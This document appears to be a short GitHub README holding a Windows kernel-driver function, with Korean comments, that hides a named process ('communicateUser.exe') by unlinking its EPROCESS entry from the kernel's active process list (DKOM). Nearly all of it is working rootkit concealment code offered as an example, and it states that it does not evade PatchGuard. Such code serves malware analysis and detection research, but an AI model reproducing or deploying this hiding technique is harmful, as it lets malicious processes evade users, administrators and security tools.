# eprocess-dkom-unlinking
 EPROCESS Unlinking example in "C" using DKOM Manipulation, This does not bypass Patchguard or common PsRoutines

```cpp
extern "C"
VOID HideProcess()
{
	PLIST_ENTRY head, currentNode, prevNode;
	PEPROCESS eprocessStart;
	unsigned char* currentProcess = NULL;
	const char target[] = "communicateUser.exe";
	ANSI_STRING targetProcessName, currentProcessName;

	// 현재 프로세스를 EPROCESS 첫 노드로 설정한다.
	eprocessStart = IoGetCurrentProcess();
	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
	RtlInitAnsiString(&targetProcessName, target);

	do
	{
		// LIST_ENTRY로부터 EPROCESS 구조체 획득
		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

		//Target Process인지 확인
		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

			// TargetProcess의 이전 노드의 다음 링크를 TargetProcess의 다음 링크로 설정한다.
			// (A->B->C->) to (A->C)
			prevNode = currentNode->Blink;
			prevNode->Flink = currentNode->Flink;

			// TargetProcess의 다음 노드의 이전 링크를 TargetProcess의 이전 링크로 설정한다.
			// (A<-B<-C<-) to (A<-C)
			currentNode->Flink->Blink = prevNode;

			// TargetProcess의 링크를 자신으로 변경
			currentNode->Flink = currentNode;
			currentNode->Blink = currentNode;
			break;
		}

		currentNode = currentNode->Flink;
	} while (currentNode->Flink != head);
	// EPROCESS는 양방향 연결리스트로 연결되기 때문에 한번 순회하면 제자리로 돌아온다.
}
```
